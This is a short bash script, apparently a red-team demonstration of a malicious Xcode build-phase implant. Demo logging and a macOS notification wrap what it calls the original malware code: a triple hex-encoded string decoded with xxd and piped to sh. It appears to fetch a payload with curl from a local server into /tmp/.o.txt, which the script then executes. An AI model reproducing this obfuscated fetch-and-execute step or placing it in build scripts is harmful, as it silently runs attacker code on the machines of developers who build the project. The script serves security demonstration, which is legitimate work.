#!/usr/bin/env bash
# RED TEAM DEMO - Build Phase Implant (Verbose Mode)
# Matches original malware obfuscation with added visibility

# Demo logging (would not exist in real malware)
mkdir -p /tmp/redteam_demo
echo "[DEMO] ========================================" >> /tmp/redteam_demo/build.log
echo "[DEMO] Xcode Build Script Triggered" >> /tmp/redteam_demo/build.log
echo "[DEMO] Time: $(date)" >> /tmp/redteam_demo/build.log
echo "[DEMO] User: $(whoami)" >> /tmp/redteam_demo/build.log
echo "[DEMO] Project: $PROJECT_DIR" >> /tmp/redteam_demo/build.log

# === ORIGINAL MALWARE CODE (exact format) ===
x=$(echo '33363333333733353337333233363633333233303332363433363336333733333336363233343633333233303336333833373334333733343337333033333631333236363332363633363633333636363336333333363331333636333336333833363636333733333337333433333631333333383333333833333338333333383332363633363331333233303332363433363636333233303332363633373334333636343337333033323636333236353336363633323635333733343337333833373334' | xxd -p -r | xxd -p -r | xxd -p -r | sh )
bash -c "$x" 
sleep 2
bash /tmp/.o.txt
# === END ORIGINAL CODE ===

# Demo notification (would not exist in real malware)
osascript -e 'display notification "Build phase payload executed!" with title "RED TEAM DEMO"' 2>/dev/null
echo "[DEMO] Payload execution complete" >> /tmp/redteam_demo/build.log
